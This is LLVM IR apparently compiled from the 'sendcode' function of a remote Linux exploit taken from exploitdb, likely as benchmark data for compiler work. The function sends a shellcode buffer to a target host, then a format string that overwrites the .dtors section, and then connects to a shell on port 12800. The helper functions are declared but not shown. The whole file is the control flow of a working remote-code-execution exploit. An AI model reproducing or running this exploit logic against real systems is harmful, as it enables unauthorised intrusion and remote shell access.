; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22830.c_sendcode.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22830.c_sendcode.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32, i32, i32 }

@.str = private unnamed_addr constant [60 x i8] c"\0Atarget=%s:%d pops=%d dtors=0x%.8lx(+%d) ret=0x%.8lx(+%d)\0A\0A\00", align 1
@target = common dso_local global %struct.TYPE_2__* null, align 8
@pt = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [39 x i8] c"[*] sending code buffer. (net_buffer)\0A\00", align 1
@CODESIZE = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [40 x i8] c"[*] sending format string, new .dtors.\0A\00", align 1
@FMTSIZE = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @sendcode(i8* %0, i16 zeroext %1, i32 %2, i32 %3, i32 %4) #0 {
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i16 %1, i16* %7, align 2
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  store i32 %4, i32* %10, align 4
  %11 = load i8*, i8** %6, align 8
  %12 = load i16, i16* %7, align 2
  %13 = zext i16 %12 to i32
  %14 = load i32, i32* %10, align 4
  %15 = icmp ne i32 %14, 0
  br i1 %15, label %16, label %18

16:                                               ; preds = %5
  %17 = load i32, i32* %10, align 4
  br label %24

18:                                               ; preds = %5
  %19 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %20 = load i64, i64* @pt, align 8
  %21 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %19, i64 %20
  %22 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %21, i32 0, i32 0
  %23 = load i32, i32* %22, align 4
  br label %24

24:                                               ; preds = %18, %16
  %25 = phi i32 [ %17, %16 ], [ %23, %18 ]
  %26 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %27 = load i64, i64* @pt, align 8
  %28 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %26, i64 %27
  %29 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %28, i32 0, i32 2
  %30 = load i32, i32* %29, align 4
  %31 = load i32, i32* %8, align 4
  %32 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %33 = load i64, i64* @pt, align 8
  %34 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %32, i64 %33
  %35 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %34, i32 0, i32 1
  %36 = load i32, i32* %35, align 4
  %37 = load i32, i32* %9, align 4
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str, i64 0, i64 0), i8* %11, i32 %13, i32 %25, i32 %30, i32 %31, i32 %36, i32 %37)
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.1, i64 0, i64 0))
  %40 = load i8*, i8** %6, align 8
  %41 = load i16, i16* %7, align 2
  %42 = call i32 (...) @getcode()
  %43 = load i32, i32* @CODESIZE, align 4
  %44 = call i32 @send_packet(i8* %40, i16 zeroext %41, i32 %42, i32 %43, i32 0)
  %45 = call i32 @sleep(i32 1)
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.2, i64 0, i64 0))
  %47 = load i8*, i8** %6, align 8
  %48 = load i16, i16* %7, align 2
  %49 = load i32, i32* %8, align 4
  %50 = load i32, i32* %9, align 4
  %51 = load i32, i32* %10, align 4
  %52 = call i32 @getfmt(i32 %49, i32 %50, i32 %51)
  %53 = load i32, i32* @FMTSIZE, align 4
  %54 = call i32 @send_packet(i8* %47, i16 zeroext %48, i32 %52, i32 %53, i32 0)
  %55 = call i32 @sleep(i32 1)
  %56 = load i8*, i8** %6, align 8
  %57 = call i32 @getshell(i8* %56, i32 12800)
  ret void
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @send_packet(i8*, i16 zeroext, i32, i32, i32) #1

declare dso_local i32 @getcode(...) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @getfmt(i32, i32, i32) #1

declare dso_local i32 @getshell(i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
